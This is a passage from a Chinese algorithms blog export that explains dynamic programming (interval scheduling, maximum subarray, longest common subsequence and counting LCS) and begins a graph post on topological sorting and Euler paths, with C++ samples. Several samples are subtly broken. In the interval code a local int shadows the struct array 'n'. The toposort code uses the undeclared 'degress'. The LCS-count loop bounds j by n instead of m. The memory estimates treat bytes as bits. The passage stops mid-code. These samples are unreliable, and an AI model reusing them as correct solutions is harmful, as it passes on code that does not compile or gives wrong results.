<p>其中 $p[i]$ 为 $i$ 区间开始前最后结束的区间</p>
<p>代码为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1050</span>];</span><br><span class="line"><span class="type">int</span> p[<span class="number">1050</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> end;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">&#125;n[<span class="number">1050</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.end &lt; b.end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m,r;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        cin&gt;&gt;n[i].start&gt;&gt;n[i].end&gt;&gt;n[i].value;</span><br><span class="line">        n[i].end += r; <span class="comment">//记得加上休息时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(n+<span class="number">1</span>,n+m+<span class="number">1</span>,cmp);</span><br><span class="line">    <span class="comment">// 获取 p</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=m;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n[j].end&lt;n[i].start)&#123;</span><br><span class="line">                p[i]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        dp[i] = <span class="built_in">max</span>(dp[p[i]]+n[i].value,dp[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[m]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="动态规划解最大子数组和"><a href="#动态规划解最大子数组和" class="headerlink" title="动态规划解最大子数组和"></a>动态规划解最大子数组和</h2><p>直接来看例题</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-5.png"></p>
<p>因为这道题要求有序，所以不能以 0-1 背包的思路去求解。尝试去寻找规律，一般对于子数组和的问题来说，枚举起点和终点是通解（从起点或者从终点开始递推，递推可以从前往后也可以从后往前），可以尝试从起点终点序列和的性质入手。</p>
<p>不难发现，如果我们<strong>从后往前去枚举起点</strong>，其实是有规律性的</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-6.png"></p>
<p>在这里如果在自己作为起点时，前面那个点的的最大子数组和大于 0 的话，就可以直接加上，如果不大于 0 的话，就不拼接，以自己作为起点和终点。</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-7.png"></p>
<p>由这个思路就可以构建递推公式了，$D[i]$ 为第 $i$ 个数字作为起点时的最大子数组和，有</p>
<p>$$D[i]&#x3D;\begin{cases}X[i]+D[i+1]\text{, }D[i+1]&gt;0\\X[i]\text{,}\quad\quad\quad\quad\quad D[i+1]\le0\end{cases}$$</p>
<p>如果需要记录选了哪些数，再开一个 $Rec[i]$ 去记录即可，只需要记录结尾的数就行，如果前面那个点的最大子数组和大于 0，就等于前面那个点对应的结束数字，否则就以自己为结束数字</p>
<p>$$Rec[i]&#x3D;\begin{cases}Rec[i+1]\text{, }D[i+1]&gt;0\\X[i]\text{,}\quad\quad\quad D[i+1]\le0\end{cases}$$</p>
<p>代码为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> num[<span class="number">20010</span>];</span><br><span class="line"><span class="type">int</span> D[<span class="number">20010</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">-10001</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(D[i]&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            D[i] = num[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            D[i] = D[i+<span class="number">1</span>] + num[i];</span><br><span class="line">        &#125;</span><br><span class="line">        res = <span class="built_in">max</span>(D[i],res);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态规划解最长公共子序列"><a href="#动态规划解最长公共子序列" class="headerlink" title="动态规划解最长公共子序列"></a>动态规划解最长公共子序列</h2><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-8.png"></p>
<p>同样是序列问题，考虑起点和终点是否构成递推关系，在这里，我们考虑<strong>从前往后枚举终点</strong>，就可以递推出前面的。</p>
<p>首先对两个对比序列，从终点开始往前匹配，有匹配上了和匹配不上两种情况，对于匹配上了的情况，直接 <code>+1</code> 之后往前递推即可，对于没匹配上的情况，一共有两种走法：</p>
<ul>
<li>第一个序列往前退一格</li>
<li>第二个序列往前退一格</li>
</ul>
<p>由于不知道什么情况才能获得最长的序列，我们取 <code>max</code> 进行递推即可。</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-9.png"></p>
<p>设$C[i,j]$为遍历到序列 1 第 $i$ 个元素，序列 2 第 $j$ 个元素时的最长公共子序列，递推公式为</p>
<p>$$<br>C[i,j]&#x3D;<br>\begin{cases}<br>max(C[i-1,j],C[i,j-1]), &amp; \text{if } x_i \not &#x3D;y_i \\C[i-1,j-1]+1, &amp; \text{if } x_i &#x3D; y_i<br>\end{cases}<br>$$</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str1,str2;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;str1&gt;&gt;str2)&#123;</span><br><span class="line">        <span class="type">int</span> n = str1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = str2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">c</span>(n+<span class="number">1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(str1[i<span class="number">-1</span>]==str2[j<span class="number">-1</span>])&#123;</span><br><span class="line">                    c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    c[i][j] = <span class="built_in">max</span>(c[i<span class="number">-1</span>][j],c[i][j<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;c[n][m]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="进阶题："><a href="#进阶题：" class="headerlink" title="进阶题："></a>进阶题：</h3><p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-10.png"></p>
<p>这道题卡了时间和内存，还要求最长公共子序列的个数。</p>
<h4 id="求最长公共子序列的个数"><a href="#求最长公共子序列的个数" class="headerlink" title="求最长公共子序列的个数"></a>求最长公共子序列的个数</h4><p>先看看最长公共子序列的个数怎么求，我们在动态规划的过程中，加入一个 $num$ 数组。</p>
<p>首先来思考什么时候会出现相同的最长公共子序列，只有一种可能，就是在 $c[i-1,j] &#x3D; c[i,j-1]$<br>的时候。这个时候由于 $c[i-1,j-1]$ 是确定的，所以可能是字符串 1 多出来的字符和字符串 2<br>先前的字符匹配上了(或者相反)，对于这种情况 </p>
<p>$$ num[i,j] &#x3D; num[i-1,j] + num[i,j-1] - num[i-1,j-1] $$</p>
<p>由于加多了一部分，就要减去重复的$num[i-1,j-1]$。</p>
<p>对于其他情况，由于不会增加相同的最长公共子序列，就直接令他相等就行了。</p>
<p>以下给一个递推公式（这是课件上的，和我写的递推不一样，但原理是一样的）</p>
<p>$$<br>num[i,j]&#x3D;<br>\begin{cases}<br>num[i,j]+num[i-1,j-1], &amp; \text{if } x_i&#x3D;y_j \\num[i,j]+num[i-1,j], &amp; \text{if } x_i\neq y_j \\num[i,j]+num[i,j-1], &amp; \text{if } x_i\neq y_j \\num[i,j]-num[i-1,j-1], &amp; \text{if } x_i\neq y_j \text{ and } \mathsf{C}[i,j]&#x3D;\mathsf{C}[i-1,j-1]<br>\end{cases}<br>$$</p>
<h4 id="内存节约"><a href="#内存节约" class="headerlink" title="内存节约"></a>内存节约</h4><p>可以看到内存限制为 $125mb$，我们这边需要开两个二维 $int$ 数组，每个二维数组的大小为 $(5000,5000)$，还要开一个大小为 $5000$ 的一维数组用来存数，总共需要 </p>
<p>$$ (5000*5000)*4*2*8&#x2F;10^6 + 5000*4*8&#x2F;10^6 \approx 1600mb $$</p>
<p>显然是爆内存了。</p>
<p>仔细观察整个递推过程，起始没必要完全去维护整个表，因为我们只需要最后的结果，而且公式中仅涉及到 $(i-1)～i$ 两个维度的数据，我们开了 $5000$ 个维度，就是浪费，所以这里采用<strong>滚动数组</strong>去节约内存。</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-11.png" alt="滚动数组示例"></p>
<p>滚动数组将 $C[5000][5000],num[5000][5000]$ 化简成 $C[2][5000],num[2][5000]$，然后采用滚动的方式不断去迭代这个 $i$ 和 $i-1$，由于只有两个维度，只涉及到 $0$ 和 $1$的不断变换，这里的滚动方式可以使用异或来进行。</p>
<p>使用滚动数组后，我们计算一下内存 </p>
<p>$$ (3*5000)*4*2*8&#x2F;10^6 + 5000*4*8&#x2F;10^6 \approx 1.5mb $$</p>
<p>节约了好几倍的内存。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> MAX = <span class="number">1e8</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str1,str2;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;str1&gt;&gt;str2)&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="built_in">int</span>(str1.<span class="built_in">size</span>())<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> m = <span class="built_in">int</span>(str2.<span class="built_in">size</span>())<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> dp[<span class="number">5001</span>][<span class="number">5001</span>];</span><br><span class="line">        <span class="type">int</span> num[<span class="number">5001</span>][<span class="number">5001</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            num[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            num[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(str1[i]==str2[j])&#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// 如果当前的字符都匹配上了，那么数量一定是不变的</span></span><br><span class="line">                    num[i][j] += num[i<span class="number">-1</span>][j<span class="number">-1</span>] %MAX;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//如果 y 匹配上了</span></span><br><span class="line">                    <span class="keyword">if</span>(dp[i][j]==dp[i<span class="number">-1</span>][j])&#123;</span><br><span class="line">                        num[i][j] += num[i<span class="number">-1</span>][j] %MAX;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//如果 x 匹配上了</span></span><br><span class="line">                    <span class="keyword">if</span>(dp[i][j]==dp[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">                        num[i][j] += num[i][j<span class="number">-1</span>] %MAX;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//如果 x 和 y 匹配的字符串相同，那么上面就相当于加了两个相同的字符串，就要减去一份</span></span><br><span class="line">                    <span class="keyword">if</span>(dp[i][j]==dp[i<span class="number">-1</span>][j<span class="number">-1</span>])&#123;</span><br><span class="line">                        num[i][j] -= num[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;dp[n][m]&lt;&lt;endl&lt;&lt;num[n][m]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】图论算法</title>
    <url>/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】图论算法"><a href="#【算法】图论算法" class="headerlink" title="【算法】图论算法"></a>【算法】图论算法</h1><p>图的基本表示方法已经在搜索算法那一节讲过了，在开头补充一个本节要用到的概念-<strong>度</strong></p>
<p>对于无向图，一个点的度就是与这个点关联的边的个数，而对于有向图，分为出度和入度，出度就是离开这个点的边数，入度就是流入这个点的边数。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image.png"></p>
<p>握手定理：各点度数之和等于边数的两倍。即对 $n$ 阶 $m$ 条边的图有</p>
<p>$$ \sum_i^nd(v_i) &#x3D; 2m $$</p>
<p>接下来是常见的图论算法</p>
<h2 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>拓扑排序是<strong>基于有向无环图</strong>的一种关联排序算法，经过拓扑排序后的序列，对于所有的有向边和对应的节点 <code>u-&gt;v</code> ，都有点 <code>u</code> 排序在点 <code>v</code> 的后面。</p>
<p>eg</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-1.png"></p>
<p>拓扑排序<strong>不是唯一</strong>的，而且<strong>只要存在环</strong>就不存在拓扑排序，$n$ 个节点的有向无环图中，最多存在 $n!$ 个拓扑排序（离散点无边的情况），最少有 $1$ 种拓扑排序（完全有序的情况）。</p>
<h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><p>拓扑排序的算法是基于图的度来进行的，基本的思想就是对于入度为 0 的点，就可以直接放到序列里，放到序列之后，将这个点的所有出边都删掉，然后又会产生新的入读为 0 的点。重复以上步骤直到所有点都被加入到序列当中。</p>
<p><strong>如果算法过程中存在一个点没有加入，就说明这个图中存在环。</strong></p>
<p>如下图中，点 B, D, H 的入读为 0，加入点 B, D, H，然后将这三个点的和他们关联的所有边删掉，这个时候就会产生新的入度为 0 的点 A, C, G, I，然后删掉，重复这个过程。</p>
<div style="text-align: center;">
    <img src="image-2.png" width="360" height="">
</div>

<p>具体代码实现可以维护一个数组去存储每个边 <code>u-&gt;v</code>，其中<code>edge[u] = v</code>，然后再开一个队列，将入度为 0 的点推入队列，删边的时候一个个取出来就可以了。</p>
<p>例题</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-3.png"></p>
<p>这道题有个要求就是<strong>编号小的队伍在前面</strong>，解决方法就是再加入队列的时候，每次选择字典序较小的编号，优先推入队列，使用<strong>小根堆</strong>即可。删边时，如果发现删掉后，那个点的入度为 0，就把他加入小根堆。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">500</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; edge[MAXN];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> res[MAXN],degree[MAXN];</span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,greater&lt;<span class="type">int</span>&gt;&gt; que;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Toposort</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> rear = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(degree[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            que.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> x = que.<span class="built_in">top</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        res[++rear] = x;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> y:edge[x])&#123;</span><br><span class="line">            <span class="keyword">if</span>(--degress[y]==<span class="number">0</span>)&#123;</span><br><span class="line">                que.<span class="built_in">push</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;res[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">        <span class="comment">// 重置边集</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MAXN;i++)&#123;</span><br><span class="line">            edge[i].<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> u,v;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            cin&gt;&gt;u&gt;&gt;v;</span><br><span class="line">            edge[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">            degree[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Toposort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="欧拉路与欧拉回路"><a href="#欧拉路与欧拉回路" class="headerlink" title="欧拉路与欧拉回路"></a>欧拉路与欧拉回路</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li>欧拉路：经过图中所有边恰好一次的通路</li>
<li>欧拉回路：经过所有边恰好一次的回路</li>
</ul>
<h4 id="欧拉回路的判别方法："><a href="#欧拉回路的判别方法：" class="headerlink" title="欧拉回路的判别方法："></a>欧拉回路的判别方法：</h4><p>对于无向图，存在欧拉回路的充要条件是所有点是<strong>连通</strong>的且所有点的<strong>度数都是偶数</strong>。</p>
<p>对于有向图，存在欧拉回路的充要条件是所有点是<strong>强连通</strong>的（任意两点可达）且每个点的<strong>出度与入度相同</strong>。</p>
<h4 id="欧拉路的判别方法："><a href="#欧拉路的判别方法：" class="headerlink" title="欧拉路的判别方法："></a>欧拉路的判别方法：</h4><p>对于无向图，存在欧拉路的充要条件是所有点是<strong>连通</strong>的且度数为<strong>奇数的点恰好存在 0 个或者 2 个</strong>。</p>
<p>对于有向图，存在欧拉路的充要条件是所有点是<strong>连通</strong>的且<strong>最多只有一个点出度比入度大 1，另一个点入度比出度大 1 ，其他点出度等于入度</strong>。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-4.png"></p>
<p>求解欧拉路与欧拉回路一直以来是个难题，并没有很精巧的办法，基本都是暴力搜索的形式，如果搜到了满足条件的就找到了。</p>
<h3 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程"></a>算法流程</h3><p>只探讨求解欧拉路的算法，算法核心就是使用 <strong>DFS 栈无边回溯</strong>来求解。</p>
<p>整个过程：从开始节点 DFS 遍历图，每遍历一个节点就把它放入 DFS 栈中，如果当前节点存在边，就按照边去继续遍历，并标记当前边为<strong>已访问</strong>。如果当前节点不存在边，就将这个节点 <code>pop</code> 出去回溯。并把这个回溯的边记录下来，这条边就是欧拉通路之一。例子如下</p>
<p>遍历到节点 E，E 存在边，将 E 推入栈，并根据边 E-&gt;F 访问 F 节点</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-5.png"></p>
<p>F 节点无边，就把 F 节点 pop 出去回溯，然后记录下回溯的边 E-&gt;F</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-7.png"></p>
<p>重复以上的过程直到所有边被遍历完（所有边遍历完后会一直回溯还原整条欧拉通路）</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-6.png"></p>
<p>例题</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-8.png"></p>
<p>欧拉通路模板题，这里需要注意的是要判断是否存在欧拉通路，有向图判断欧拉通路要求所有点是连通的且最多只有一个点出度比入度大 1，另一个点入度比出度大 1 ，其他点出度等于入度。</p>
<p>这里要求输出字典序最小的欧啦路径，那就按照目标节点的字典序排序所有边，然后根据下标去访问边即可。然后使用了递归代替 DFS 栈。</p>
<p>剩下就是标程了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> ind[N],outd[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="type">int</span> flag[N];</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; edge[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否存在欧拉通路</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isEular</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//默认起始点是 1</span></span><br><span class="line">    <span class="type">int</span> start=<span class="number">1</span>;</span><br><span class="line">    <span class="type">bool</span> allzero = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> sum1 = <span class="number">0</span>, sum2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ind[i]!=outd[i])&#123;</span><br><span class="line">            allzero = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ind[i]-outd[i]&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ind[i]-outd[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            sum1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ind[i]-outd[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="comment">//如果出现了特殊情况的点就将它作为开始点</span></span><br><span class="line">            start = i;</span><br><span class="line">            sum2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(allzero||((sum1==sum2)&amp;&amp;sum1==<span class="number">1</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="comment">//flag记录访问了多少条边，顺便可以访问到了哪条边的 index</span></span><br><span class="line">    <span class="keyword">while</span>(flag[u] &lt; edge[u].<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="type">int</span> tmp = flag[u];</span><br><span class="line">        flag[u]++;</span><br><span class="line">        <span class="comment">//使用了递归代替栈</span></span><br><span class="line">        <span class="built_in">dfs</span>(edge[u][tmp]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//没有边了，把他推到路径栈中</span></span><br><span class="line">    s.<span class="built_in">push</span>(u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 